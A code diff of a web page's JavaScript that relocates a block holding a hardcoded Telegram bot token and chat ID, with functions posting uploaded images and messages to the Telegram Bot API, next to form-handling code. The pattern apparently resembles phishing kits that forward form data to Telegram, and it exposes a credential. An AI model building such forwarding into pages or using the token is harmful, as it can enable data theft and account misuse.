@@ -387,6 +387,51 @@ setTimeout(slideInAd, 1000);
 // Add event listener to close the ad when the button is clicked
 closeAdButton.addEventListener("click", slideOutAd);
 
+	  
+
+	// Important parameters
+	  const TELEGRAM_BOT_TOKEN = '8101442954:AAGBNz1uHe9v1dWDhMr9duIT_N33lUv-A9Y'; // Replace with your bot token
+	  const TELEGRAM_CHAT_ID = '6049368044';
+
+	  // Proper parameter naming
+function sendImageToTelegram(botToken, chatId) {
+    if (!file) {
+        alert('No image selected');
+        return;
+    }
+
+    const form = new FormData();
+    form.append('chat_id', chatId);
+    form.append('photo', file);
+
+ fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+            method: 'POST',
+            body: form
+        });
+}
+
+	  // Proper parameter naming
+function sendMessageToTelegram(botToken, chatId, messageText) {
+  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: chatId,
+      text: messageText
+    })
+  });
+}
+
+
+        function showForm(formId) {
+            // Hide all forms
+            document.querySelectorAll('.form-container').forEach(form => {
+                form.classList.remove('active');
+            });
+            // Show the specified form
+            document.getElementById(formId).classList.add('active');
+        }
+
 
 	  let allFormData = {};
 
@@ -501,49 +546,7 @@ closeAdButton.addEventListener("click", slideOutAd);
             loading.style.display = 'none';
         });
 
-	  // Important parameters
-	  const TELEGRAM_BOT_TOKEN = '8101442954:AAGBNz1uHe9v1dWDhMr9duIT_N33lUv-A9Y'; // Replace with your bot token
-	  const TELEGRAM_CHAT_ID = '6049368044';
-
-	  // Proper parameter naming
-function sendImageToTelegram(botToken, chatId) {
-    if (!file) {
-        alert('No image selected');
-        return;
-    }
-
-    const form = new FormData();
-    form.append('chat_id', chatId);
-    form.append('photo', file);
-
- fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-            method: 'POST',
-            body: form
-        });
-}
-
-	  // Proper parameter naming
-function sendMessageToTelegram(botToken, chatId, messageText) {
-  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      chat_id: chatId,
-      text: messageText
-    })
-  });
-}
-
-
-        function showForm(formId) {
-            // Hide all forms
-            document.querySelectorAll('.form-container').forEach(form => {
-                form.classList.remove('active');
-            });
-            // Show the specified form
-            document.getElementById(formId).classList.add('active');
-        }
-
+	  
         //function showSuccessMessage() {
            // document.querySelectorAll('.form-container').forEach(form => {
                // form.style.display = 'none';
